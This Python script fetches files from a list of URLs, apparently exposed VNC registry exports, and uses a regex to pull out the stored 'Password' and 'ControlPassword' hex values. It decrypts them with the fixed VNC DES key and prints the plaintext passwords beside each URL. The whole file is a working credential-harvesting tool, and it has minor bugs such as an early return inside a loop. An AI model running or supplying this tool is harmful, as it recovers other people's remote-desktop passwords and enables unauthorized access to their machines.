#!/usr/bin/python3
from Crypto.Cipher import DES
from binascii import unhexlify, hexlify
from urllib.parse import urlparse
import requests,re,os
urls = [
]
headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
}

def fetch_passwords(url):
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        content = response.text
        matches = re.findall(r'"(Password|ControlPassword)"=hex:(.\*)', content)
        passwords = {"Password": [], "ControlPassword": []}
        for match in matches:
            password_type, hex_value = match
            passwords[password_type].append(hex_value)
            return passwords
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return {}

def vnc_decode(hex_data):
    key = unhexlify("e84ad660c4721ae0")
    iv = unhexlify("0000000000000000")
    binary_data = unhexlify(hex_data)
    cipher = DES.new(key, DES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(binary_data)
    try:
        decrypted_string = decrypted_data.decode('utf-8').rstrip('\\x00')
        return decrypted_string
    except UnicodeDecodeError as e:
        print("Error decoding decrypted data:", e)

for url in urls:
    passwords = fetch_passwords(url)
    parsed_url = urlparse(url)
    path = parsed_url.path
    file_name = os.path.basename(path)
    if passwords["Password"]:
        print(url+' Password: '+vnc_decode(passwords['Password'][0].replace('\\r','').replace(',','')))
    if passwords["ControlPassword"]:
        print(url+' Control password:'+vnc_decode(passwords['ControlPassword'][0].replace('\\r','').replace(',','')))
